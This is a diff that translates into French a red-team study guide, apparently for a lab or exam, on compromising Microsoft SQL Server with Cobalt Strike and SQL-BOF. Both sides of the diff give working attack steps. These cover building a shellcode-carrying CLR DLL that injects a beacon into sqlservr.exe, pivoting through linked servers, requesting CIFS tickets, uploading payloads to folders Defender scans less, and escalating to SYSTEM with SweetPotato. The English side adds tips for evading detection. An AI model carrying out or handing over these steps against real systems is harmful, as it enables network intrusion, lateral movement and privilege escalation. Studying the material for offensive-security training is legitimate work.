@@ -4,12 +4,12 @@
 
 **Pourquoi SQL Server ?** Les instances SQL utilisent des comptes de service dont les droits doivent être vérifiés. SQL CLR et les Linked Servers peuvent étendre les possibilités d’exécution et de connexion entre machines.
 
-* [Load SQL-BOF](#load-sql-bof-aggressor-script)
-* [SQL Enumeration](#sql-enumeration)
+* [Charger SQL-BOF](#charger-le-script-sql-bof-aggressor)
+* [Énumération SQL](#énumération-sql)
 * [Impersonation](#impersonation)
-* [Code Execution via SQL CLR](#code-execution-via-sql-clr)
-* [SQL Lateral Movement](#sql-lateral-movement)
-* [SQL Privilege Escalation](#sql-privilege-escalation)
+* [SQL CLR](#exécution-de-code-avec-sql-clr)
+* [Lateral Movement SQL](#lateral-movement-sql)
+* [Privilege Escalation SQL](#privilege-escalation-sql)
 
 ---
 
@@ -147,46 +147,46 @@ sql-whoami lon-db-1                      # confirm sysadmin role
 
 ---
 
-## Code Execution via SQL CLR
+## Exécution de code avec SQL CLR
 
-**Why:** With sysadmin access, SQL CLR (Common Language Runtime) lets you load a .NET assembly (DLL) directly into SQL Server's memory and execute arbitrary .NET code. This is far stealthier than `xp_cmdshell` because code runs *inside* `sqlservr.exe` — no child process spawned, no `cmd.exe` in the process tree.
+**Principe :** le rôle `sysadmin` peut permettre d’activer SQL CLR, qui exécute une assembly .NET dans le contexte du processus `sqlservr.exe`. L’absence de processus enfant n’implique pas l’absence de traces ou de détection.
 
-### Step 1 — Check and enable SQL CLR
+### Vérifier puis activer SQL CLR
 
 ```
 sql-query lon-db-1 "SELECT value FROM sys.configurations WHERE name = 'clr enabled'"
 sql-enableclr lon-db-1
 ```
 
-> `OPSEC-CAUTION` — enabling CLR changes SQL Server's `sp_configure` state. This is logged in `sys.configurations` change history and may alert a SIEM if SQL config auditing is active.  
-> CLR must be enabled for the server to accept and execute your assembly.
+> `OPSEC-CAUTION` — l’activation de CLR modifie la configuration SQL Server via `sp_configure`. Elle peut être enregistrée par les outils d’audit.  
+> CLR doit être activé pour que l’instance accepte les assemblies .NET.
 
-### Step 2 — Generate SMB beacon shellcode
+### Générer le binaire SMB prévu dans le lab
 
 **Payloads → Windows Stageless Payload:**
-- Listener: `smb` — SMB named pipe beacon for internal lateral movement (works when direct TCP is blocked by firewalls)
-- Output: `Raw` — raw shellcode bytes, no PE wrapper
-- Exit Function: `Thread` — the thread exits but the SQL process stays running, avoiding crashes
+- Listener: `smb` — Beacon utilisant une named pipe SMB lorsque les connexions TCP directes sont limitées
+- Output: `Raw` — données binaires brutes sans conteneur PE
+- Exit Function: `Thread` — termine le thread plutôt que le processus SQL Server
 - x64: ✓
-- Save: `C:\Payloads\smb_x64.xthread.bin`
+- Enregistrer : `C:\Payloads\smb_x64.xthread.bin`
 
-> `OPSEC-CAUTION` — unobfuscated shellcode embedded in the DLL may be flagged by Defender on disk. For the exam, generate via a malleable profile with sleep mask and obfuscation enabled.  
-> `Thread` exit function is important — `Process` exit would kill `sqlservr.exe`, terminating the SQL service and creating a noisy crash event.
+> `OPSEC-CAUTION` — une DLL intégrant des octets de payload peut déclencher une détection Microsoft Defender. L’évaluation doit tenir compte de la configuration du lab.  
+> La fonction de sortie `Thread` évite de terminer directement le processus `sqlservr.exe`.
 
-### Step 3 — Build the CLR DLL in Visual Studio
+### Compiler la DLL CLR dans Visual Studio
 
-**Visual Studio → New Project → Class Library (.NET Framework) C#:**
-- Project name: `MyProcedure`
-- Place solution and project in same directory: ✓ (simplifies the output path)
-- Framework: .NET Framework 4.7.2 (must match what SQL Server's CLR runtime supports)
+**Visual Studio → New Project → Class Library (.NET Framework) C# :**
+- Nom du projet : `MyProcedure`
+- Placer le projet et la solution dans le même dossier : ✓
+- Framework: .NET Framework 4.7.2 (doit correspondre au runtime CLR pris en charge par SQL Server)
 
-**Add shellcode as embedded resource:**
-1. Solution Explorer → right-click project → Add → Existing Item → select `C:\Payloads\smb_x64.xthread.bin`
-2. Click the file in Solution Explorer → Properties → Build Action: **Embedded Resource**
+**Ajouter le fichier binaire comme ressource intégrée :**
+1. Solution Explorer → clic droit sur le projet → Add → Existing Item → choisir `C:\Payloads\smb_x64.xthread.bin`
+2. Sélectionner le fichier dans Solution Explorer → Properties → Build Action : **Embedded Resource**
 
-> Embedding as a resource bundles the shellcode *inside* the DLL binary. This avoids a separate file write to disk during execution — the DLL carries its own payload.
+> Une ressource intégrée est incluse directement dans la DLL ; le programme peut ensuite la lire depuis son manifeste.
 
-**Critical: verify the embedded resource name in code:**
+**Attention : vérifier le nom exact de la ressource intégrée dans le code :**
 
 ```c#
 // Resource name format: <AssemblyName>.<filename>
@@ -194,35 +194,35 @@ sql-enableclr lon-db-1
 using (var rs = assembly.GetManifestResourceStream("MyProcedure.smb_x64.xthread.bin"))
 ```
 
-> Mismatch here (`smb.x64.xthread.bin` vs `smb_x64.xthread.bin`) causes a null reference — the payload silently fails with no error. Double-check by looking at the file name in Solution Explorer.
+> Une différence entre `smb.x64.xthread.bin` et `smb_x64.xthread.bin` peut renvoyer une référence `null`. Vérifier le nom du fichier dans Solution Explorer.
 
-**Build:** Switch to Release mode → Build → Build Solution  
-Output DLL: `C:\Users\Attacker\source\repos\MyProcedure\bin\Release\MyProcedure.dll`
+**Compilation :** sélectionner le mode Release → Build → Build Solution  
+DLL générée : `C:\Users\Attacker\source\repos\MyProcedure\bin\Release\MyProcedure.dll`
 
-### Step 4 — Load and execute the CLR payload on the SQL server
+### Charger et exécuter l’assembly CLR sur SQL Server
 
 ```
 sql-clr lon-db-1 C:\Users\Attacker\source\repos\MyProcedure\bin\Release\MyProcedure.dll MyProcedure
 ```
 
-> `OPSEC-CAUTION` — SQL-BOF reads the DLL from your attacker machine, uploads it to SQL Server's CLR runtime, registers it as an unsafe assembly, creates a stored procedure (`MyProcedure`), and calls it.  
-> The shellcode executes inside `sqlservr.exe` via `VirtualAlloc` + `WriteProcessMemory` + `CreateThread`. The beacon runs as the SQL service account (e.g., `NT Service\MSSQLSERVER`).  
-> `TRUSTWORTHY` must be set on the database, or the assembly must be signed — `sql-clr` handles this automatically.
+> `OPSEC-CAUTION` — SQL-BOF charge la DLL dans le contexte SQL CLR, enregistre l’assembly et appelle la procédure stockée `MyProcedure`.  
+> Dans le lab, le code .NET utilise `VirtualAlloc`, `WriteProcessMemory` et `CreateThread` dans `sqlservr.exe` ; les permissions correspondent au compte de service SQL.  
+> Le chargement de certaines assemblies nécessite une configuration de confiance ou une signature appropriée. Contrôler les paramètres `TRUSTWORTHY` et les permissions.
 
-### Step 5 — Link to the new SMB beacon
+### Établir la liaison avec le nouveau Beacon SMB
 
-The CLR payload created an SMB named pipe beacon inside `sqlservr.exe`. To connect to it, your beacon must present a valid CIFS/SMB service ticket for lon-db-1.
+Dans ce lab, le Beacon SMB écoute via une named pipe au sein de `sqlservr.exe`. La connexion exige un contexte CIFS/SMB autorisé pour `lon-db-1`.
 
-**Option A — Link from pchilds' beacon (preferred — Windows auto-requests CIFS ticket):**
+**Méthode A — connexion depuis le Beacon `pchilds` :**
 
 ```
 link lon-db-1 TSVCPIPE-4b2f70b3-ceba-42a5-a4b5-704e1c41337
 ```
 
-> `OPSEC-SAFE` — run this from the original pchilds medium-integrity beacon. Windows automatically uses pchilds' cached TGT to request a `cifs/lon-db-1` service ticket from the KDC, then authenticates the SMB named pipe connection. No manual ticket work.  
-> The TSVCPIPE name is defined in your CS SMB listener configuration. Hit TAB to autocomplete if you forget it.
+> `OPSEC-SAFE` dans ces notes — Windows peut utiliser le contexte Kerberos déjà disponible dans le Beacon `pchilds` pour une authentification SMB.  
+> Le nom `TSVCPIPE` dépend de la configuration du listener SMB. La touche TAB permet parfois de compléter le nom.
 
-**Option B — Manually request CIFS ticket (when running from an impersonated/no-TGT context):**
+**Méthode B — examiner la demande manuelle d’un ticket CIFS :**
 
 ```
 krb_asktgs /service:cifs/lon-db-1.contoso.com /ticket:[rsteel-TGT-base64]
@@ -238,101 +238,101 @@ run klist                                                      # confirm cifs/lo
 link lon-db-1 TSVCPIPE-4b2f70b3-ceba-42a5-a4b5-704e1c41337
 ```
 
-> `OPSEC-CAUTION` — .kirbi file written to disk. Delete after linking: `rm C:\Users\Attacker\Desktop\cifs.kirbi`  
-> Use Option B when your current beacon context (e.g. an impersonated token session that lacks a valid TGT) cannot auto-request CIFS tickets.  
-> **Why CIFS specifically:** SMB named pipe authentication uses the CIFS service class, not MSSQLSvc. You need a separate ticket for the link step.
+> `OPSEC-CAUTION` — un fichier `.kirbi` temporaire est écrit sur le disque. Après le lab, supprimer : `rm C:\Users\Attacker\Desktop\cifs.kirbi`  
+> La méthode B concerne les sessions ne pouvant pas demander automatiquement un ticket de service CIFS.  
+> **Pourquoi CIFS ?** L’authentification SMB utilise la classe de service CIFS, distincte de `MSSQLSvc`.
 
-### Step 6 — Disable CLR after use
+### Rétablir le paramètre CLR après le lab
 
 ```
 sql-disableclr lon-db-1
 ```
 
-> `OPSEC-SAFE` — clean up. Reverting CLR to disabled reduces your footprint and removes the exploitation path for defenders reviewing SQL config after the fact.
+> `OPSEC-SAFE` dans ces notes — le retour à la configuration initiale fait partie du nettoyage du lab.
 
 ---
 
-## SQL Lateral Movement
+## Lateral Movement SQL
 
-**Why:** SQL Server linked server relationships allow one SQL instance to query another on your behalf. If the link runs with sysadmin credentials on the downstream server, you can execute CLR payloads there without needing direct network access from your attacker machine. This is how you reach SQL servers in network segments blocked from your attacker host.
+**Principe :** un Linked Server permet à une instance SQL d’interroger une autre instance. Les droits accordés sur le serveur distant dépendent du mapping d’authentification et de ses rôles SQL.
 
-### Enumerate links and verify downstream privileges
+### Énumérer les Linked Servers et les permissions distantes
 
 ```
 sql-links lon-db-1                          # show all linked servers configured on lon-db-1
 sql-whoami lon-db-1 "" lon-db-2             # check your privilege level on lon-db-2 via the link
 ```
 
-> `OPSEC-SAFE` — BOF-based queries, no child process.  
-> The `""` second argument means no intermediate hop — direct link query from lon-db-1 to lon-db-2.  
-> If you see `sysadmin` on lon-db-2 via the link, the link is configured with elevated credentials and is exploitable.
+> `OPSEC-SAFE` dans les notes — requêtes BOF sans processus enfant.  
+> Le deuxième argument `""` signifie qu’aucun saut intermédiaire n’est indiqué dans cette commande du lab.  
+> Un rôle `sysadmin` sur `lon-db-2` indique que le compte utilisé dispose de permissions élevées sur l’instance distante.
 
-### Enable RPC Out on the link (required for CLR execution)
+### Vérifier et activer RPC Out sur le Linked Server
 
 ```
 sql-checkrpc lon-db-1                       # query current RPC Out status on all links
 sql-enablerpc lon-db-1 lon-db-2             # enable RPC Out on the link to lon-db-2
 ```
 
-> `OPSEC-CAUTION` — modifying link configuration is logged in SQL Server error log and visible in `sys.servers`.  
-> **Why RPC Out is needed:** `EXECUTE AT linked_server` (which is how SQL-BOF executes CLR remotely) requires RPC Out to be enabled on the link. Without it, you can query data but cannot execute stored procedures on the remote server.
+> `OPSEC-CAUTION` — une modification du Linked Server peut apparaître dans les journaux SQL Server et dans `sys.servers`.  
+> **Pourquoi RPC Out ?** L’instruction `EXECUTE AT linked_server` nécessite RPC Out pour lancer certaines procédures sur l’instance distante.
 
-### Execute CLR payload on lon-db-2 via the link
+### Exécuter l’assembly CLR sur `lon-db-2` via le lien
 
 ```
 sql-clr lon-db-1 C:\Users\Attacker\source\repos\MyProcedure\bin\Release\MyProcedure.dll MyProcedure "" lon-db-2
 ```
 
-> `OPSEC-CAUTION` — same CLR injection as before, but tunneled through the lon-db-1 → lon-db-2 SQL link.  
-> The fourth argument `""` = no intermediate, fifth argument `lon-db-2` = target linked server.  
-> The beacon executes inside `sqlservr.exe` on lon-db-2, running as that server's MSSQL service account.
+> `OPSEC-CAUTION` — le lab reproduit le chargement CLR via le lien SQL entre `lon-db-1` et `lon-db-2`.  
+> Le quatrième argument `""` désigne l’absence de saut intermédiaire ; le cinquième désigne `lon-db-2`.  
+> Dans le scénario, le Beacon fonctionne dans le processus `sqlservr.exe` de `lon-db-2`, avec les droits du compte de service local.
 
-### Link to the new beacon on lon-db-2 (run from lon-db-1's beacon)
+### Établir la liaison avec le Beacon de `lon-db-2`
 
 ```
 link lon-db-2 TSVCPIPE-4b2f70b3-ceba-42a5-a4b5-704e1c41337
 ```
 
-> `OPSEC-SAFE` — SMB named pipe connection from lon-db-1 to lon-db-2.  
-> **Critical: run this command from the lon-db-1 beacon, not the attacker machine.**  
-> **Why:** lon-db-2 may be on a separate network segment with firewall rules blocking direct attacker-to-lon-db-2 SMB traffic. lon-db-1 is network-adjacent to lon-db-2 (the SQL link already proves connectivity). By linking from lon-db-1's beacon, you build a chain: `Attacker CS → lon-db-1 beacon → lon-db-2 beacon`.  
-> The lon-db-1 beacon runs as the MSSQL service account, which has CIFS access to lon-db-2 (same account that drives the SQL link).
+> `OPSEC-SAFE` dans ces notes — connexion SMB par named pipe entre les deux serveurs.  
+> **Contexte du lab :** la connexion est effectuée depuis le Beacon de `lon-db-1`.  
+> **Réseau :** `lon-db-2` peut être isolé de l’Attacker Desktop. Le lab utilise la connectivité SMB entre les deux serveurs pour établir cette chaîne : `Attacker CS → Beacon lon-db-1 → Beacon lon-db-2`.  
+> Le Beacon de `lon-db-1` utilise un compte de service MSSQL dont les autorisations CIFS doivent être vérifiées.
 
-### Disable RPC after use
+### Rétablir RPC Out après le lab
 
 ```
 sql-disablerpc lon-db-1 lon-db-2
 ```
 
-> `OPSEC-SAFE` — clean up. Revert RPC Out to reduce footprint.
+> `OPSEC-SAFE` dans ces notes — restaurer la configuration RPC Out initiale.
 
 ---
 
-## SQL Privilege Escalation
+## Privilege Escalation SQL
 
-**Why:** The MSSQL service account running your beacon has `SeImpersonatePrivilege` by design — SQL Server requires it to impersonate client connections. This privilege lets a local service account impersonate any user (including SYSTEM) via Windows COM/DCOM authentication coercion. SweetPotato exploits this.
+**Contexte :** ce lab étudie les conséquences de `SeImpersonatePrivilege` sur un compte de service SQL. Sa présence dépend de la configuration et doit être confirmée avant toute analyse.
 
-### Identify the privilege
+### Vérifier le privilège du compte SQL
 
 ```
 whoami /priv    # BOF - check token privileges
 ```
 
-> Look for `SeImpersonatePrivilege: Enabled`.  
-> The MSSQL service account (`NT Service\MSSQLSERVER`) always holds this privilege — it is granted by Windows as part of service account setup, not misconfiguration.
+> Rechercher la valeur `SeImpersonatePrivilege: Enabled`.  
+> Le compte `NT Service\MSSQLSERVER` peut disposer de ce privilège. Le vérifier plutôt que de le supposer.
 
-### Generate TCP-local payload (SYSTEM beacon)
+### Générer le binaire TCP local du lab
 
 **Payloads → Windows Stageless Payload:**
-- Listener: `tcp-local` — binds only to `127.0.0.1`, no external network exposure
-- Output: Windows EXE
-- Exit Function: Process
+- Listener: `tcp-local` — écoute sur `127.0.0.1`, sans exposition directe sur une interface externe
+- Format de sortie : exécutable Windows
+- Fonction de sortie : Process
 - x64: ✓
-- Save: `C:\Payloads\tcp-local_x64.exe`
+- Enregistrer : `C:\Payloads\tcp-local_x64.exe`
 
-> `tcp-local` is necessary because lon-db-2 may have no inbound firewall path back to your team server. The beacon connects locally and you reach it via the existing beacon chain (attacker → lon-db-1 → lon-db-2 → SYSTEM beacon on lon-db-2).
+> `tcp-local` permet au lab d’utiliser une connexion en loopback lorsque `lon-db-2` n’accepte pas de connexions directes depuis le team server.
 
-### Upload payload to a less-monitored directory
+### Examiner le transfert du payload dans le lab
 
 ```
 cd C:\Windows\ServiceProfiles\MSSQLSERVER\AppData\Local\Microsoft\WindowsApps
@@ -340,26 +340,26 @@ pwd
 upload C:\Payloads\tcp-local_x64.exe
 ```
 
-> `OPSEC-CAUTION` — file write to disk.  
-> **Why this directory:** The MSSQL service account owns its own service profile. `WindowsApps` within that profile is writable by the service account and less aggressively scanned by Defender compared to `C:\Windows\Temp` or `C:\Users\Public`. For the exam, generate a custom artifact to avoid static Defender signatures on the EXE.
+> `OPSEC-CAUTION` — écriture de fichier sur le disque.  
+> **Répertoire :** le scénario utilise un chemin situé dans le profil du compte de service MSSQL. Les permissions du dossier et la couverture Defender doivent être vérifiées ; aucune absence de détection n’est garantie.
 
-### Exploit SeImpersonatePrivilege with SweetPotato
+### Étudier `SeImpersonatePrivilege` avec SweetPotato
 
 ```
 execute-assembly C:\Tools\SweetPotato\bin\Release\SweetPotato.exe -p "C:\Windows\ServiceProfiles\MSSQLSERVER\AppData\Local\Microsoft\WindowsApps\tcp-local_x64.exe"
 ```
 
-> `OPSEC-CAUTION` — `execute-assembly` uses fork & run (spawns a sacrificial process). SweetPotato creates a fake COM server, coerces a privileged Windows service to authenticate to it via DCOM, captures the SYSTEM token, then runs your payload under that token.  
-> The result: your EXE runs as `NT AUTHORITY\SYSTEM`.  
-> For the exam: ensure `spawnto` is set to a non-signatured binary in your malleable profile (`post-ex { set spawnto_x64 "%windir%\\sysnative\\dllhost.exe"; }`).
+> `OPSEC-CAUTION` — `execute-assembly` s’appuie sur fork-and-run. Le scénario SweetPotato décrit l’usage d’une authentification DCOM et d’un token privilégié pour étudier une élévation locale.  
+> Résultat présenté dans le lab : exécution sous `NT AUTHORITY\SYSTEM`.  
+> La configuration `spawnto` du Malleable C2 Profile doit être cohérente avec les contraintes et règles du lab.
 
-### Connect to the SYSTEM beacon
+### Se connecter au Beacon SYSTEM
 
 ```
 connect localhost 1337
 ```
 
-> `OPSEC-SAFE` — loopback TCP connection from lon-db-2's MSSQL beacon to the newly spawned SYSTEM beacon on the same host. No external network traffic.  
-> Port `1337` is defined in your `tcp-local` listener configuration.
+> `OPSEC-SAFE` dans ces notes — connexion TCP locale entre deux sessions sur `lon-db-2`.  
+> Le port `1337` est défini dans le listener `tcp-local`.
 
-New beacon spawned as `NT AUTHORITY\SYSTEM` on lon-db-2.
+Dans le scénario, le nouveau Beacon s’exécute sous `NT AUTHORITY\SYSTEM` sur `lon-db-2`.
